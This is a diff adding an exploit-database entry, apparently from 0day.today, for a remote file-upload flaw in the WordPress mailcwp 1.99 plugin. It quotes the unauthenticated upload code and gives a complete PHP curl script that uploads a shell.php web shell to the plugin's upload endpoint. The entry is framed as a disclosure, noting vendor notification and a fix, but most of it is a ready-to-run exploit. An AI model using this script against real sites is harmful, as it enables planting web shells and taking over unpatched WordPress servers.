@@ -1,0 +1,55 @@
+id: 23914
+date: 07/21/2015
+title: WordPress Mailcwp 1.99 Shell Upload Exploit
+author: Larry Cashdollar
+cves: 
+
+Title: Remote file upload vulnerability in mailcwp v1.99 wordpress plugin
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-09
+Download Site: https://wordpress.org/plugins/mailcwp/
+Vendor: CadreWorks Pty Ltd
+Vendor Notified: 2015-07-09 fixed in v1.110
+Vendor Contact: Contact Page via WP site
+Description: MailCWP, Mail Client for WordPress. A full-featured mail client plugin providing webmail access through your WordPress blog or website.
+Vulnerability:
+The code in mailcwp-upload.php  doesn't check that a user is authenticated or what type of file is being uploaded any user can upload a shell to the target wordpress server:
+
+  2 $message_id = $_REQUEST["message_id"];
+  3 $upload_dir = $_REQUEST["upload_dir"];
+.
+.
+  8 $fileName = $_FILES["file"]["name"];
+  9 move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$fileName");
+
+Exploitation requires the attacker to guess a writeable location in the http server root.
+
+CVEID:
+OSVDB:
+Exploit Code:
+  • <?php
+  • /*Larry W. Cashdollar @_larry0
+  • Exploit for mailcwp v1.99 shell will be called 1-shell.php.
+  • 7/9/2015
+  • */
+  •         $target_url = 'http://www.example.com/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=1&upload_dir=/usr/share/wordpress/wp-content/uploads';
+  •         $file_name_with_full_path = '/var/www/shell.php';
+  •  
+  •         echo "POST to $target_url $file_name_with_full_path";
+  •         $post = array('file' => 'shell.php','file'=>'@'.$file_name_with_full_path);
+  •  
+  •         $ch = curl_init();
+  •         curl_setopt($ch, CURLOPT_URL,$target_url);
+  •         curl_setopt($ch, CURLOPT_POST,1);
+  •         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+  •         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+  •         $result=curl_exec ($ch);
+  •         curl_close ($ch);
+  •         echo "<hr>";
+  •         echo $result;
+  •         echo "<hr>";
+  • ?>
+  •  
+Advisory: http://www.vapid.dhs.org/advisory.php?v=138
+
+#  0day.today [2023-03-24]  #
